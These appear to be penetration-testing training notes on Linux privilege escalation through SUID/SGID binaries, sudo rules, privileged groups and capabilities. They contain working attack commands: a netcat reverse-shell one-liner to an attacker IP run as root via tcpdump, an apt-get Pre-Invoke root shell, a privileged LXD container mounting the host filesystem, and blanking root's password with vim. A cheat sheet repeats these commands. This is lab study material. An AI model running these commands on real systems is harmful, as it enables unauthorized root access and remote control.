## 1. Why Permissions Are a Whole Category of Their Own

Where the previous section was about tricking the *shell* into running the wrong thing, this section is about something more direct: permissions and privileges that were granted — deliberately or by mistake — and can be ridden straight to root. This covers special file permission bits, misconfigured sudo rules, membership in certain "privileged" groups, and Linux's more fine-grained capability system. Each of these is a legitimate Linux feature with a real, valid use case; the escalation opportunity shows up specifically when one of them is set too loosely.

## 2. Special Permissions: SUID and SGID

### 2.1 The SUID Bit

**SUID** (Set User ID upon execution) lets a program run with the permissions of whoever *owns* the file, rather than the permissions of whoever is actually running it. If a binary is owned by root and has its SUID bit set, running that binary temporarily grants root-level permissions for the duration of that program — regardless of who launched it.

The SUID bit shows up in a file listing as an `s` in the owner's execute position, e.g. `-rwsr-xr-x`. 

Think of it like a bank's safety-deposit-box key that works only inside one specific vault door — anyone holding that one key can open that one door with the vault's own authority, without ever being handed the vault's master key for anything else.

### 2.2 Finding SUID Binaries

```bash
$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-xr-x 1 root root 16728 Sep  1 19:06 /home/john/shared_obj_hijack/payroll
-rwsr-xr-x 1 root root 16728 Sep  1 22:05 /home/mickey/payroll
-rwSr--r-- 1 root root 0 Aug 31 02:51 /home/pluto/netracer
-rwsr-xr-x 1 root root 40152 Nov 30  2017 /bin/mount
-rwsr-xr-x 1 root root 40128 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 27608 Nov 30  2017 /bin/umount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 54256 May 17  2017 /usr/bin/passwd
...<SNIP>...
```

- `find / -user root -perm -4000` searches the whole filesystem for files owned by root with the SUID bit set (`4000` is the octal value of the SUID permission bit); `-exec ls -ldb {} \;` runs a detailed listing on every match, and `2>/dev/null` hides permission-denied noise.
- Most of the entries here (`mount`, `su`, `passwd`, `ping`, etc.) are **standard, expected** SUID binaries — they need to briefly act as root to do their job (e.g. `passwd` needs root access to update `/etc/shadow`) and are normally considered safe.
- What stands out are the non-standard ones: `/home/john/shared_obj_hijack/payroll`, `/home/mickey/payroll`, and `/home/pluto/netracer` — custom binaries sitting in home directories with the SUID bit set are exactly the kind of thing worth reverse engineering, since they're far more likely to have an exploitable flaw or an abusable extra feature than a well-audited system binary.
- Note the one entry shown as `-rwSr--r--` (capital `S`) rather than lowercase `s` — a capital `S` means the SUID bit is set, but the file isn't actually marked executable for the owner. It still carries the SUID flag, but can't be run as-is in that state.

### 2.3 The SGID Bit

**SGID** (Set Group ID) works the same way as SUID, but for group ownership instead of user ownership: running an SGID binary temporarily grants the permissions of the group that owns the file, rather than the permissions of whichever group the current user belongs to.

```bash
$ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine
```

- `find / -user root -perm -6000` searches for files owned by root carrying the SUID and SGID bits together — `6000` octal is `4000` (SUID) plus `2000` (SGID) combined, so this finds files with **both** bits set, not SGID alone. That matches the single result above, `-rwsr-sr-x`, which shows a lowercase `s` in both the owner and group execute positions.
- To search for SGID **by itself**, the correct flag is `-perm -2000` — searching only with `-6000` will miss any file that has SGID set on its own, without SUID alongside it.

## 3. GTFOBins

[GTFOBins](https://gtfobins.org/) is a curated, community-maintained catalog of common Unix binaries and scripts that can be abused to bypass security restrictions — breaking out of restricted shells, escalating privileges, spawning reverse shells, or transferring files, usually by leaning on a legitimate feature of the program in an unintended way.

```bash
$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

# id
uid=0(root) gid=0(root) groups=0(root)
```

- `apt-get` supports a `Pre-Invoke` hook — a command it runs *before* performing its main action. By pointing that hook at `/bin/sh` and running the whole thing under `sudo`, the shell itself gets spawned with root privileges before `apt-get` even gets to the "update" part.
- It's worth becoming familiar with as many GTFOBins entries as possible ahead of time, since recognizing "oh, this binary is on that list" the moment it turns up during enumeration (Section 7 of the services/internals notes, and Section 2.2 of `/bin` SUID binaries above) saves a lot of time compared to researching each one from scratch mid-engagement.

## 4. Sudo Rights Abuse

### 4.1 Checking Current Sudo Rights

**Sudo** lets an account run specific commands as root (or another user) without fully switching users or being granted broad, standing privileges. Every time `sudo` is run, the system checks the rules configured in `/etc/sudoers` to decide whether the current user is allowed to do what they're asking.

```bash
$ sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

- `sudo -l` ("list") shows exactly what the current user is allowed to run with sudo. Checking this immediately after landing on any system is a standard first move.
- Entries marked `NOPASSWD` can be seen (and used) without ever having to supply a password — other entries may require knowing the user's own password before `sudo -l` will reveal them.
- Here, `sysadm` can run `/usr/sbin/tcpdump` as root, with no password required.

### 4.2 How Misconfigurations Happen

A `sudoers` entry is misconfigured whenever it grants more than the user strictly needs for their job — either by handing out broad root access with no password, or by allowing a specific command *too loosely*, letting it be run in a way the administrator never intended. The `tcpdump` entry above is a textbook example of the second kind: `tcpdump` looks harmless on the surface (it's just a packet-capture tool), but it has a feature that goes well beyond "read network traffic."

### 4.3 Walkthrough: Abusing tcpdump's postrotate-command

```bash
$ man tcpdump

<SNIP> 
-z postrotate-command              

Used in conjunction with the -C or -G options, this will make `tcpdump` run " postrotate-command file " where the file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip2 will compress each savefile using gzip or bzip2.
```

- The `-z` flag tells `tcpdump` to run a given command every time it finishes writing (rotating) a capture file. It's intended for something simple like compressing the file afterward — but there's nothing stopping it from pointing at an arbitrary script instead.

```bash
$ cat /tmp/.test

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```

- This is a classic reverse-shell one-liner: it deletes any old named pipe at `/tmp/f`, creates a fresh one (`mkfifo`), then wires an interactive shell's input and output through that pipe into a `netcat` connection back to the attacker's listening machine at `10.10.14.3:443`.

```bash
$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

dropped privs to root
tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
6 packets received by filter
compress_savefile: execlp(/tmp/.test, /dev/null) failed: Permission denied
0 packets dropped by kernel
```

- `-w /dev/null` writes captured packets nowhere meaningful (not needed for the attack itself), `-G 1` rotates the capture file every second, `-W 1` limits it to one file, and `-z /tmp/.test` tells `tcpdump` to run that script every time a file rotates — in this case, almost immediately. `-Z root` tells `tcpdump` which user to drop privileges to for the main capture process, while the `postrotate-command` itself is launched before that drop takes effect, still carrying root.
- The `Permission denied` message shown is just the script missing its executable bit in this run — the overall technique still works once that's corrected (as the next step shows).

```bash
hacker@kali:~$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938
bash: cannot set terminal process group (10797): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id && hostname               
id && hostname
uid=0(root) gid=0(root) groups=0(root)
NIX02
```

- A `netcat` listener (`nc -lnvp 443`, listening on port 443) catches the incoming reverse shell, confirmed as root by the `id` output — the "no job control" and "ioctl" lines are just normal cosmetic side effects of a minimal, non-interactive shell spawned this way, not errors that stop it from working.
- **Note:** more recent distributions often have [AppArmor](https://wiki.ubuntu.com/AppArmor) profiles that restrict exactly which commands `tcpdump`'s `postrotate-command` is allowed to run, which closes off this specific technique on a hardened, up-to-date system.

### 4.4 Best Practices for Granting Sudo

Two practices administrators should always follow when writing `sudoers` entries (and worth checking for as an attacker, since their absence is the actual vulnerability):

1. **Always use the absolute path to any binary in a sudoers entry.** Specifying just `cat` instead of `/bin/cat` opens the door to PATH abuse (covered in the previous section) — an attacker could place a malicious file named `cat` somewhere earlier in the user's `PATH` and have it run instead of the real command, inheriting whatever privilege the sudoers rule grants.
2. **Grant sudo access sparingly, following least privilege.** Before handing a user broad sudo rights, ask whether one or two narrowly-scoped entries would cover their actual job. The tighter the grant, the smaller the attack surface for exactly this kind of escalation.

## 5. Privileged Groups

Certain group memberships hand out privileges that are functionally equivalent to root, even though the account itself was never directly given root access.

### 5.1 LXC / LXD

**LXD** is Ubuntu's container manager, broadly comparable to Docker. On many systems, every user gets added to the `lxd` group automatically upon installation — and that membership alone can be ridden to full root access by creating a *privileged* container and using it to reach the host filesystem.

```bash
devops@NIX02:~$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

- Confirms the `devops` user belongs to the `lxd` group (GID 110).

```bash
devops@NIX02:~$ unzip alpine.zip 

Archive:  alpine.zip
extracting: 64-bit Alpine/alpine.tar.gz  
inflating: 64-bit Alpine/alpine.tar.gz.root  
cd 64-bit\ Alpine/
```

- Unpacks a prebuilt Alpine Linux container image — Alpine is popular for this purpose because it's extremely small and fast to boot.
- Start the LXD initialization process. Choose the defaults for each prompt. Consult this [post](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) for more information on each step.

```bash
devops@NIX02:~$ lxd init

Do you want to configure a new storage pool (yes/no) [default=yes]? yes
Name of the storage backend to use (dir or zfs) [default=dir]: dir
Would you like LXD to be available over the network (yes/no) [default=no]? no
Do you want to configure the LXD bridge (yes/no) [default=yes]? yes

/usr/sbin/dpkg-reconfigure must be run as root
error: Failed to configure the bridge
```

- `lxd init` sets up LXD for first use. The networking-bridge step fails here because that specific piece legitimately requires root — but this doesn't block the rest of the attack, since the storage pool (the part that actually matters) was already configured.

```bash
devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

Image imported with fingerprint: be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a41831b5afff48f8d1b
```

- Registers the unpacked Alpine image locally under the alias `alpine`, ready to launch as a container.

```bash
devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true

Creating r00t
```

- This is the critical step: creating a container named `r00t` with `security.privileged=true`. A **privileged container** runs without the usual UID mapping that normally isolates a container's "root" user from the host's actual root — meaning root *inside* this container is the exact same root as on the host.

```bash
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

Device mydev added to r00t
```

- Mounts the entire host filesystem (`/`) into the container at `/mnt/root`, making every file on the host directly browsable from inside it.

```bash
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)
~ #
```

- `lxc exec r00t /bin/sh` opens a shell inside the running container — and because this is a privileged container, that shell is root, and root here has the same authority as root on the actual host. Browsing to `/mnt/root/root` inside the container is equivalent to browsing `/root` on the host itself, making files like `/etc/shadow` or any user's SSH keys directly readable (or writable).

### 5.2 Docker

Membership in the `docker` group is, in practice, equivalent to root-level filesystem access without ever needing a password — because any member can spawn new containers with arbitrary host directories mounted inside them. For example:

```bash
docker run -v /root:/mnt -it ubuntu
```

- This mounts the host's `/root` directory into the new container at `/mnt`. Once the container starts, that mounted directory can be browsed freely from inside it — retrieving or planting SSH keys for the root user. The same trick works for other sensitive directories, such as mounting `/etc` to retrieve `/etc/shadow` for offline password cracking, or to add a new privileged user directly to the host's user database.

### 5.3 Disk

Members of the `disk` group have full access to every raw device under `/dev` — including things like `/dev/sda1`, typically the main storage device backing the entire operating system. With that level of raw device access, a tool like `debugfs` can be used to browse the *entire* filesystem with root-level privileges, bypassing normal file permission checks entirely. As with the Docker case, this can be used to retrieve SSH keys, harvest credentials, or add a new user.

### 5.4 ADM

Members of the `adm` group can read every log file under `/var/log`. This doesn't hand over root access directly, but log files frequently contain sensitive data worth mining — user actions, application errors that leak internal details, or evidence of running cron jobs that might themselves be worth targeting (see the earlier wildcard-abuse cron example).

```bash
secaudit@NIX02:~$ id

uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```

- Confirms `secaudit` belongs to the `adm` group (GID 4).

## 6. Linux Capabilities

### 6.1 What Capabilities Are

**Linux capabilities** break the old all-or-nothing "root vs. everyone else" model into smaller, individually grantable privileges. Instead of handing a process full root access just so it can do *one* root-only thing (like binding to a low-numbered network port), a specific capability can be granted for exactly that one action, leaving everything else restricted. This is more secure in principle — a smaller, more precise grant of power than traditional Unix permissions — but it introduces its own risk: a capability handed to a process that isn't properly sandboxed, or a capability granted more broadly than actually needed, can be turned into a full privilege escalation path.

### 6.2 Setting a Capability

```bash
$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

- `setcap` assigns a specific capability to a specific executable. This example grants `cap_net_bind_service` to `vim.basic`, which would let that binary bind to network ports normally reserved for root — purely as an illustration of the syntax here, not a realistic real-world configuration.

### 6.3 Capabilities Worth Knowing

| Capability | Description |
|---|---|
| `cap_sys_admin` | Broad administrative privileges — modifying system files, changing system settings |
| `cap_sys_chroot` | Change the root directory for the current process, reaching files otherwise inaccessible |
| `cap_sys_ptrace` | Attach to and debug other processes — potentially exposing sensitive data or letting behavior be altered |
| `cap_sys_nice` | Raise or lower process priority, potentially accessing resources that would otherwise be restricted |
| `cap_sys_time` | Modify the system clock — can manipulate timestamps or cause unexpected behavior elsewhere |
| `cap_sys_resource` | Modify system resource limits (max open files, max memory allocation, etc.) |
| `cap_sys_module` | Load and unload kernel modules — can change OS behavior or expose sensitive data |
| `cap_net_bind_service` | Bind to network ports normally reserved for root |

### 6.4 Capability Values

When using `setcap`, the value assigned alongside the capability name decides exactly how it's applied:
 
| Value | Description |
|---|---|
| `=` | Sets the capability but grants no actual privilege — useful for clearing a previously set capability |
| `+ep` | Grants the **e**ffective and **p**ermitted privileges — the executable can use the capability, but it isn't passed on to anything it spawns |
| `+ei` | Grants the **e**ffective and **i**nheritable privileges — the executable can use the capability, and child processes it spawns inherit it too |
| `+p` | Grants only the **p**ermitted privilege — available to the executable, but not automatically inherited by children |

### 6.5 Capabilities That Commonly Lead to Root

| Capability | Why It's Dangerous |
|---|---|
| `cap_setuid` | Lets a process set its own effective user ID — including switching to root's |
| `cap_setgid` | Lets a process set its own effective group ID — including switching to root's group |
| `cap_sys_admin` | A broad grab-bag of administrative actions, many normally reserved for root alone |
| `cap_dac_override` | Bypasses file read, write, and execute permission checks entirely |

### 6.6 Enumerating Capabilities

```bash
$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```

- This searches the standard binary folders and runs `getcap` on every file found, printing only the ones that actually have a capability assigned. `cap_net_raw` on `ping` and `mtr-packet` is normal and expected (both tools need raw network access to function); `cap_dac_override=eip` on `vim.basic` is the standout — a text editor with full permission-bypass powers is a serious red flag.

### 6.7 Walkthrough: Exploiting cap_dac_override on vim

```bash
$ getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
```

- Confirms the capability directly on the binary in question: `vim.basic` carries `cap_dac_override` with effective, inheritable, and permitted flags all set (`eip`).
- Because of this, running `vim.basic` as a regular user still lets it bypass normal file permission checks entirely — meaning it can edit files a normal user shouldn't be able to touch, like `/etc/passwd`.

```bash
$ cat /etc/passwd | head -n1

root:x:0:0:root:/root:/bin/bash
```

- The `x` in root's password field means the real password hash lives in `/etc/shadow`, not here — but that `x` can simply be deleted.

```bash
$ /usr/bin/vim.basic /etc/passwd
```

- Opens `/etc/passwd` directly in the capability-carrying editor, which can save changes to the file despite normal permissions saying a regular user shouldn't be able to.

```bash
$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
$ cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash
```

- This achieves the same edit without opening an interactive session: `-es` runs vim in "Ex" silent mode, taking a scripted series of commands via stdin. The `:%s/^root:[^:]*:/root::/` command finds the line starting with `root:` and blanks out whatever sits in the password field between the first two colons, then `wq!` force-saves and quits.
- With the `x` gone, root's password field is now completely empty. An empty password field on a `root:` line means `su` (switch user) can log in as root with **no password prompt at all** — handing over a full root shell.

## 8. Cheat Sheet

| Goal | Command |
|---|---|
| Find SUID binaries owned by root | `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null` |
| Find files with SUID **and** SGID both set | `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null` |
| Find SGID-only files | `find / -perm -2000 -type f 2>/dev/null` |
| Check current sudo rights | `sudo -l` |
| Look up a binary's abuse potential | Check it against [GTFOBins](https://gtfobins.org) |
| Abuse tcpdump's sudo rights for a root shell | `sudo tcpdump -ln -i <iface> -w /dev/null -W 1 -G 1 -z <script> -Z root` |
| Check current group memberships | `id` |
| Spawn a privileged LXD container and mount the host filesystem | `lxc init alpine r00t -c security.privileged=true` then `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true` |
| Mount a host directory into a new Docker container | `docker run -v /root:/mnt -it ubuntu` |
| Set a capability on a binary | `sudo setcap <capability>=<value> <path>` |
| List a binary's current capabilities | `getcap <path>` |
| Enumerate all capability-bearing binaries | `find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;` |
| Blank root's password field via `cap_dac_override` on vim | `echo -e ':%s/^root:[^:]*:/root::/\nwq!' \| /usr/bin/vim.basic -es /etc/passwd` |

## 9. Big-Picture Takeaways

1. **Every technique here starts with a legitimate feature, not a bug.** SUID/SGID, sudo, privileged groups, and capabilities all exist for good reasons — the escalation path only opens up when one of them is configured more broadly than it needed to be.
2. **"Non-standard" is the pattern to watch for.** A SUID binary sitting in `/bin` is usually fine; the same bit set on a custom script in someone's home directory is immediately suspicious. The skill is in telling ordinary system configuration apart from something an administrator (or an attacker) added.
3. **GTFOBins turns "I found a SUID/sudo/capability binary" into "here's exactly how to abuse it."** Checking any interesting binary against that list before trying to reverse-engineer it from scratch saves enormous amounts of time.
4. **"Need a password first" is not the same as "safe."** `adm` group membership, for instance, grants no direct root access — but reading every log on the system is often more than enough to eventually find a password or a cron job worth hijacking anyway.
5. **Container and virtualization features are a direct line to the host if not isolated properly.** LXD and Docker group membership both boil down to the same underlying risk: if a user can launch a container with elevated privileges or a host directory mounted inside it, they can use that container as a tunnel straight into the host's own files.
6. **Precision matters when enumerating permission bits.** As seen with the SUID/SGID example, getting the exact octal permission value wrong (`6000` vs `2000` vs `4000`) changes what a search actually finds — always double-check that the command you're running matches the specific bit you're actually looking for.
7. **The end goal is always a concrete, verifiable result.** Whether it's a reverse shell landing as `root`, a blank password field letting `su` through without a prompt, or a direct shell inside a privileged container, always confirm the outcome with something unambiguous like `id` rather than assuming a technique worked.
